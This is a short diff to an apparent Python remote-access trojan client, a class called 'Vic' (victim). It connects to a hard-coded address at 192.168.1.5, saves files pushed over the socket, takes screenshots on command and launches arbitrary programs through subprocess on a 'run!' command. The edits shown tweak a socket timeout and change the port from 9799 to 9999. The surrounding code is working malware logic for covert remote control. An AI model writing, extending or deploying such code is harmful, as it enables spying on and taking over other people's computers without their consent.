@@ -56,8 +56,8 @@ class Vic():
             f = open(f_name,'wb')
         except:
             f = open("TMPfailled",'wb')
-        self.s.settimeout(1)
         chunk = self.s.recv(1024)
+        self.s.settimeout(2)
         while(chunk):
             f.write(chunk)
             try:
@@ -105,7 +105,6 @@ class Vic():
             elif (cmd[:3] == "ss!"):
                 self.screenShot(cmd[4:])
                 
-
             elif (cmd[:4] == "run!"):
                 try:
                     prog = subprocess.Popen([cmd[5:]])
@@ -146,4 +145,4 @@ class Vic():
                 
                            
 
-Vic("192.168.1.5",9799)
+Vic("192.168.1.5",9999)
